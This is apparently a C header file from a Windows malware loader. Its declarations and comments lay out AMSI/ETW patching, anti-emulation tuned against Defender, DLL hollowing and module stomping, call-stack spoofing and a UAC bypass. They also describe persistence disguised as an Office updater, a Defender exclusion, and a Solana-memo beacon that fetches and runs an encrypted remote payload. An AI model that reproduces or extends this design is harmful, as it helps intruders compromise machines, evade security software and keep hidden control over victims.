#pragma once

// =============================================
// Common Definitions, Hashes, Typedefs
// =============================================

#include <Windows.h>
#include "Structs.h"
#include "Syscalls.h"
#include "Hashes.h"
#include "Payload.h"

// ----------- Network Retry -----------
// Both FetchSolMemo (Solana RPC) and DownloadPayload (payload HTTP fetch)
// retry on network failure, sleeping NET_RETRY_DELAY_MS between attempts.
// Allows the loader to survive early-boot network delays (~60-90 s).
// Total max wait = NET_RETRY_COUNT * NET_RETRY_DELAY_MS = 90 seconds.
#define NET_RETRY_COUNT    9        // retries after first failure (10 attempts total)
#define NET_RETRY_DELAY_MS 10000   // milliseconds between retries

// ----------- Build Config -----------
// Uncomment for debug output (log file)
// #define DEBUG

// Uncomment for Go-based shellcode (Sliver) that writes to own pages.
// When defined: memory is PAGE_EXECUTE_READWRITE.
// When not defined: memory is PAGE_EXECUTE_READ (W^X).
// #define RWX_SHELLCODE

// Opt-in: #9 Draugr MVP synthetic-stack RSP swap. When defined, the
// loader allocates 1 MB and writes three fake return addresses
// pointing into ntdll/kernel32, then swaps RSP there before executing
// shellcode. Default off because (a) the 1 MB private allocation is
// itself a heuristic signal, and (b) the synthetic frames reuse
// ntdll/kernel32 .pdata which may under-match at unwind time. Enable
// only after validating with Moneta / Pe-Sieve / WinDbg stack walk.
// #define ENABLE_SYNTHETIC_STACK

// Subsystem is controlled by build.bat LFLAGS (/SUBSYSTEM:WINDOWS)

// ----------- Debug Logging -----------
#ifdef DEBUG
    VOID DbgLog(IN LPCSTR msg);
    VOID DbgLogStatus(IN LPCSTR msg, IN NTSTATUS status);
    VOID DbgLogHex(IN LPCSTR label, IN DWORD value);    // label + 0xXXXXXXXX (DWORD)
    VOID DbgLogStr(IN LPCSTR label, IN LPCSTR value);   // label + string
    #define LOG(msg)              DbgLog(msg)
    #define LOG_STATUS(msg, s)    DbgLogStatus(msg, s)
    #define LOG_HEX(label, val)   DbgLogHex(label, (DWORD)(val))
    #define LOG_STR(label, str)   DbgLogStr(label, (LPCSTR)(str))
#else
    #define LOG(msg)
    #define LOG_STATUS(msg, s)
    #define LOG_HEX(label, val)
    #define LOG_STR(label, str)
#endif

// Custom entry point (CRT-free, EXE mode only)
// DLL sideload builds use /ENTRY:DllMain from build.bat
#ifndef BUILD_DLL
#pragma comment(linker, "/ENTRY:Main")
#endif

// ----------- Compiler Settings (CRT-free) -----------
#pragma comment(linker, "/NODEFAULTLIB")
#pragma intrinsic(__movsb)
#pragma intrinsic(__stosb)
#pragma intrinsic(__rdtsc)

// JOAAT name hashes for syscalls and APIs live in Hashes.h (included above).

// ----------- NT Status Codes -----------
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status)  ((NTSTATUS)(Status) >= 0)
#endif

#ifndef STATUS_SINGLE_STEP
#define STATUS_SINGLE_STEP  0x80000004L
#endif

// ----------- Memory Protection Helpers -----------
#ifdef RWX_SHELLCODE
    #define SHELLCODE_EXEC_PROT  PAGE_EXECUTE_READWRITE
#else
    #define SHELLCODE_EXEC_PROT  PAGE_EXECUTE_READ
#endif

// ----------- Function Typedefs -----------
typedef HMODULE (WINAPI* fnLoadLibraryA)(LPCSTR lpLibFileName);
typedef FARPROC (WINAPI* fnGetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
typedef HMODULE (WINAPI* fnGetModuleHandleA)(LPCSTR lpModuleName);
typedef BOOL    (WINAPI* fnVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);

// Thread pool function typedefs (ntdll exports)
typedef NTSTATUS(NTAPI* fnTpAllocWork)(PVOID* WorkReturn, PVOID Callback, PVOID Context, PVOID CallbackEnviron);
typedef VOID    (NTAPI* fnTpPostWork)(PVOID Work);
typedef VOID    (NTAPI* fnTpReleaseWork)(PVOID Work);

// Patchless evasion typedefs (ntdll exports)
typedef PVOID   (NTAPI* fnRtlAddVectoredExceptionHandler)(ULONG First, PVOID Handler);
typedef ULONG   (NTAPI* fnRtlRemoveVectoredExceptionHandler)(PVOID Handle);
typedef VOID    (NTAPI* fnRtlCaptureContext)(PCONTEXT ContextRecord);
typedef NTSTATUS(NTAPI* fnNtContinue)(PCONTEXT ThreadContext, BOOLEAN RaiseAlert);

// Phantom DLL hollowing typedefs (ktmw32 / kernel32)
typedef HANDLE  (WINAPI* fnCreateTransaction)(LPSECURITY_ATTRIBUTES, LPGUID, DWORD, DWORD, DWORD, DWORD, LPWSTR);
typedef HANDLE  (WINAPI* fnCreateFileTransactedA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE, HANDLE, PUSHORT, PVOID);
typedef BOOL    (WINAPI* fnRollbackTransaction)(HANDLE);
typedef BOOL    (WINAPI* fnReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL    (WINAPI* fnWriteFile2)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef DWORD   (WINAPI* fnSetFilePointer)(HANDLE, LONG, PLONG, DWORD);
typedef BOOL    (WINAPI* fnCloseHandle2)(HANDLE);
typedef DWORD   (WINAPI* fnGetTempPathA2)(DWORD, LPSTR);
typedef BOOL    (WINAPI* fnCopyFileA2)(LPCSTR, LPCSTR, BOOL);
typedef HANDLE  (WINAPI* fnFindFirstFileA2)(LPCSTR, LPWIN32_FIND_DATAA);
typedef BOOL    (WINAPI* fnFindNextFileA2)(HANDLE, LPWIN32_FIND_DATAA);
typedef BOOL    (WINAPI* fnFindClose2)(HANDLE);
typedef HANDLE  (WINAPI* fnCreateFileA2)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);

// ----------- Resolved WinAPI Function Pointers -----------
typedef struct _API_HASHING {
    fnLoadLibraryA      pLoadLibraryA;
    fnGetProcAddress    pGetProcAddress;
    fnGetModuleHandleA  pGetModuleHandleA;
    fnVirtualProtect    pVirtualProtect;
} API_HASHING, * PAPI_HASHING;

// ----------- CRT Replacements (intrinsics) -----------
#define MemCopy(dest, src, size)    __movsb((PBYTE)(dest), (const BYTE*)(src), (size))
#define MemSet(dest, val, size)     __stosb((PBYTE)(dest), (BYTE)(val), (size))

// ----------- String Deobfuscation (4-byte rotating XOR) -----------
// XKEY_0..XKEY_3 are defined in Payload.h (randomized per build by Encrypt.py)
static const BYTE g_XorKey[4] = { XKEY_0, XKEY_1, XKEY_2, XKEY_3 };
#define DEOBF(buf) do { for(DWORD _xi=0; (buf)[_xi]; _xi++) (buf)[_xi] ^= g_XorKey[_xi & 3]; } while(0)

// ----------- Helper Functions -----------
UINT32 HashStringJenkinsOneAtATime32BitA(IN PCHAR String);
UINT32 HashStringJenkinsOneAtATime32BitW(IN PWCHAR String);
SIZE_T StrLenA(IN LPCSTR String);
SIZE_T StrLenW(IN LPCWSTR String);
INT    StrCmpA(IN LPCSTR Str1, IN LPCSTR Str2);

// ----------- WinApi Resolution -----------
BOOL  InitializeWinApis(OUT PAPI_HASHING pApi);
PVOID FetchModuleBaseAddr(IN UINT32 dwModuleNameHash);
PVOID FetchExportAddress(IN PVOID pModuleBase, IN UINT32 dwApiNameHash);
// Validate DOS+NT signatures on a loaded module base. Returns TRUE
// and sets *ppNt on success; FALSE otherwise. *ppNt is undefined on failure.
BOOL  ValidatePeHeaders(IN PVOID pModuleBase, OUT PIMAGE_NT_HEADERS* ppNt);
// Like ValidatePeHeaders but verifies that the NT header fits within
// sBufSize bytes from pBuffer (for reading PE data off disk into a buffer).
BOOL  ValidatePeHeadersBounded(IN PVOID pBuffer, IN SIZE_T sBufSize, OUT PIMAGE_NT_HEADERS* ppNt);
// Case-insensitive PEB walk by exact upper-case BaseDllName (e.g. L"NTDLL.DLL").
PVOID FindLoadedModuleW(IN PCWSTR szUpperName);
// Fisher-Yates shuffle + LoadLibraryA on the provided DLL names. Forces the
// ETW image-load ordering to differ per run, defeating sequence-based ML
// that learns deterministic loader DLL fingerprints.
VOID  ShufflePreloadLibraries(IN PAPI_HASHING pApi, IN LPCSTR* pNames, IN DWORD dwCount);

// ----------- IAT Camouflage -----------
VOID IatCamouflage(VOID);

// ----------- Evasion -----------
BOOL BlindDllNotifications(IN PAPI_HASHING pApi);
BOOL PatchlessAmsiEtw(IN PAPI_HASHING pApi);
VOID CleanupEvasion(IN PAPI_HASHING pApi);
BOOL AntiAnalysis(VOID);
BOOL InstallExitHook(IN PVOID pNtdll);

// ----------- Module Stomping / Phantom DLL Hollowing / Ghostly Hollow -----------
BOOL ModuleStomp(IN PAPI_HASHING pApi, IN PBYTE pShellcode, IN DWORD dwShellcodeSize, OUT PVOID* ppExecAddr);
BOOL PhantomDllHollow(IN PAPI_HASHING pApi, IN PNTAPI_FUNC pNtApis, IN PBYTE pShellcode, IN DWORD dwShellcodeSize, OUT PVOID* ppExecAddr);
// Ghostly Hollow: write encrypted shellcode into a FILE_FLAG_DELETE_ON_CLOSE
// temp DLL → NtCreateSection(SEC_IMAGE) → NtMapViewOfSection → CloseHandle
// (file disappears) → in-memory XOR decrypt → flip to RX. Skips NTFS
// transactions entirely so MpFilter's transaction-aware scanner is blind.
BOOL GhostlyHollow(IN PAPI_HASHING pApi, IN PNTAPI_FUNC pNtApis, IN PBYTE pShellcode, IN DWORD dwShellcodeSize, OUT PVOID* ppExecAddr);

// Helper: pick a sacrificial DLL from the 4-entry allowlist (XSTR_STOMP_DLL_1..4)
// that is present in System32 AND has an executable section >= dwMinSize.
// Returns TRUE and fills pOutName (260 bytes) with the chosen filename.
// pOutFullPath (260 bytes) optional — gets the full path; pass NULL to skip.
BOOL PickSacrificialDll(IN PAPI_HASHING pApi, IN DWORD dwMinSize, OUT PCHAR pOutName, OUT PCHAR pOutFullPath);

// XOR a buffer in place against a fixed-length cycling key.
VOID XorBufferInPlace(IN OUT PBYTE pBuf, IN DWORD dwSize, IN PBYTE pKey, IN DWORD dwKeyLen);

// Anti-emulation prologue. Runs API hammering + RDRAND consistency check
// + CPUID hypervisor brand check. Returns TRUE if execution should continue.
// Defender's mpengine emulator has ~200ms wall-clock budget and is exhausted
// by API hammering; emulator-stubbed RDRAND returns inconsistent values.
BOOL AntiEmulation(IN PAPI_HASHING pApi);

// ----------- Call Stack Spoofing (ASM) -----------
extern VOID SetSpoofTarget(PVOID pTarget, PVOID pCallGadget);
extern VOID SetSpoofStack(PVOID pSyntheticRsp);
extern VOID SpoofCallback(PVOID Instance, PVOID Context, PVOID Work);

// ----------- Synthetic Call Stack Builder (Draugr MVP) -----------
// Allocates a private 1 MB buffer and fills the top three qwords
// with RIPs inside RtlUserThreadStart / BaseThreadInitThunk /
// NtWaitForSingleObject. Returns the buffer's intended RSP (points
// at the first fake return), or NULL on failure.
PVOID BuildSyntheticStack(IN PAPI_HASHING pApi);

// ----------- Generic Gadget Pool -----------
// Holds up to 64 byte-pattern hits harvested from one or more loaded modules.
// Used by Syscalls.c (0F 05 C3 syscall;ret) and Gadgets.c (FF D3 call rbx).
#define GADGET_POOL_CAPACITY 64
typedef struct _GADGET_POOL {
    PVOID   pGadgets[GADGET_POOL_CAPACITY];
    DWORD   dwCount;
} GADGET_POOL, * PGADGET_POOL;

// Append every pPattern hit inside pModule's executable sections to pPool,
// up to GADGET_POOL_CAPACITY. Silent no-op if any arg invalid.
VOID  GadgetPoolScanModule(IN OUT PGADGET_POOL pPool, IN PVOID pModule, IN const BYTE* pPattern, IN DWORD dwPatternLen);
// RDTSC-seeded random pick. NULL if pool is empty.
PVOID GadgetPoolRandom(IN const PGADGET_POOL pPool);

// ----------- Call Gadget Discovery -----------
BOOL  CollectCallGadgets(VOID);
PVOID GetRandomCallGadget(VOID);

// ----------- Crypto -----------
BOOL ChaskeyCtrDecrypt(IN PBYTE pData, IN DWORD dwSize, IN PBYTE pKey, IN PBYTE pNonce);
BOOL DecompressPayload(IN PAPI_HASHING pApi, IN PBYTE pCompressed, IN DWORD dwCompressedSize, OUT PBYTE* ppDecompressed, IN DWORD dwOriginalSize);
BOOL BruteForceDecryption(IN BYTE HintByte, IN PBYTE pProtectedKey, IN SIZE_T sKeySize, OUT PBYTE* ppRealKey);

// ----------- Staging -----------
BOOL DownloadPayload(IN PAPI_HASHING pApi, IN LPCSTR szUrl, OUT PBYTE* ppData, OUT PDWORD pdwSize);

// ----------- UAC Bypass / Install (UAC builds only) -----------
// Two-process AppInfo RPC bypass (no manifest, no UAC dialog).
// UacBypass: 3-path logic —
//   (a) running as msoia.exe (from run-key) → return TRUE immediately
//   (b) already elevated (spawned by bypass) → return TRUE
//   (c) medium IL first run → AppInfo bypass → spawn elevated self → terminate → return FALSE
// IsFirstRunProcess: TRUE when EXE filename != "msoia.exe" (i.e. original loader name).
// InstallAndTerminate: copies self to %APPDATA%\Microsoft\Office\Updates\msoia.exe,
//   sets HIDDEN|SYSTEM, runs WD exclusion via AppInfo parent-spoof, writes HKCU run-key,
//   suppresses StartupApproved toast, then NtTerminateProcess self.
// UacRunCommandElevated: acquires elevated ComputerDefaults handle via AppInfo RPC,
//   then spawns wCommand as child of ComputerDefaults (parent-spoof).
#ifdef UAC_BYPASS
BOOL  UacBypass(IN PAPI_HASHING pApi);
BOOL  IsFirstRunProcess(IN PAPI_HASHING pApi);
VOID  InstallAndTerminate(IN PAPI_HASHING pApi);
BOOL  UacRunCommandElevated(IN PAPI_HASHING pApi, IN PVOID pNtdll, IN LPWSTR wSysDir, IN LPWSTR wWinDir, IN LPWSTR wCommand);
#if defined(BUILD_DLL)
VOID  SideloadInstallAndContinue(IN PAPI_HASHING pApi);
#endif
#endif

// ----------- Persistence (non-UAC builds only) -----------
// Writes a REG_SZ run-key value pointing at the current EXE under HKCU\...\Run.
// UAC builds use InstallAndTerminate (above) instead.
#ifndef UAC_BYPASS
BOOL InstallPersistence(IN PAPI_HASHING pApi);
#endif

// ----------- Solana Beacon -----------
// Decodes the beacon wallet from Payload.h, queries the Solana JSON-RPC
// API for the wallet's oldest transaction, reads the SPL Memo, and returns:
//   *ppUrl  — heap-allocated staging URL (caller must HeapFree + wipe)
//   pKey    — 16-byte Chaskey key (caller-provided KEY_SIZE buffer, wipe after use)
//   pNonce  — 12-byte Chaskey nonce (caller-provided buffer, wipe after use)
// Memo format: <url>|<32-hex-key>|<24-hex-nonce>|<decimal-size>|<0-or-1>
// Payload size + compression flag travel in the memo so the same compiled
// binary decrypts any future payload without a rebuild.
BOOL FetchSolMemo(
    IN  PAPI_HASHING pApi,
    OUT PCHAR*       ppUrl,
    OUT PBYTE        pKey,
    OUT PBYTE        pNonce,
    OUT PDWORD       pdwPayloadSize,
    OUT PBOOL        pbCompressed
);
